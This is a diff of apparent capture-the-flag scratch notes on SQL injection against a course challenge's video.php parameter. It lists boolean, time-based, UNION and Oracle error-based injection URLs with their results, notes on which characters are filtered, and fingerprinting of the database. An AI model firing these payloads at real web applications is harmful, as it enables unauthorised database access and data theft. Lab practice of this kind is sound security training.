@@ -1,40 +1,12 @@
-https://edu-ctf.csie.org:10159/video.php?vid=1/**/OR/**/IF(1,SLEEP(5),1)=1#
-> Error
+Current/**/DB:
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/SELECT/**/SYS.DATABASE_NAME/**/FROM/**/DUAL  (error)
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/all/**/select/**/null,null,null/**/from/**/dual  (nothing)
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/SELECT/**/banner/**/FROM/**/v$version/**/where/**/rownum=1  (error)
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/SELECT/**/DISTINCT/**/OWNER/**/FROM/**/ALL_TABLES  (error)
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/SELECT/**/*/**/FROM/**/DUAL  (error)
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/SELECT/**/*/**/FROM/**/news/**/WHERE/**/id=1/**/and/**/CTXSYS.DRITHSX.SN(user,/**/(SELECT/**/banner/**/FROM/**/v$version/**/WHERE/**/rownum=1))=1  (bad cat)
 
-https://edu-ctf.csie.org:10159/video.php?vid=1/**/OR/**/IF(1,SLEEP(5),1)=1--
-> Error
+List/**/DBs
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/SELECT/**/DISTINCT/**/owner/**/FROM/**/all_tables  (error)
 
-https://edu-ctf.csie.org:10159/video.php?vid=-1/**/UNION/**/SELECT/**/1,2,3,4--
-> Error
-
-https://edu-ctf.csie.org:10159/video.php?vid=8-1/**/AND/**/1=1
-> 第 7 個影片
-
-https://edu-ctf.csie.org:10159/video.php?vid=8-1/**/AND/**/1=1/**/LIMIT/**/1,1#
-> Error
-
-
-https://edu-ctf.csie.org:10159/video.php?vid=8-1/**/OR/**/1=1
-> 第 1 個影片
-
-https://edu-ctf.csie.org:10159/video.php?vid=8-1/**/OR/**/1=1#
-> 同上
-
-https://edu-ctf.csie.org:10159/video.php?vid=8-1/**/OR/**/1=1
-> 同上
-
-https://edu-ctf.csie.org:10159/video.php?vid=8-1/**/AND/**/IF(2=1,SLEEP(5),1)=1/**/LIMIT/**/1,1#
-> ERROR
-
-不能用 LIMIT, ', IF, SLEEP, ||, +, 
-
-可以用 OR, AND, -, *, /, 
-
-#, --, /**/ 都是註解
-『MySQL』, 『PostgreSQL』,『Microsoft SQL Server』,『Oracle Database』
-不是 MySQL : mySQL 的 -- 不是註解
-不是 PostgreSQL : postgreSQL 的 # 不是註解
-不是 Microsoft SQL : Microsoft SQL 的 # 不是註解
-不是 Oracle Database : Oracle Database 的 # 不是註解
-
-是 MariaDB
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/SELECT/**/SYS.DATABASE_NAME/**/FROM/**/DUAL  (error)
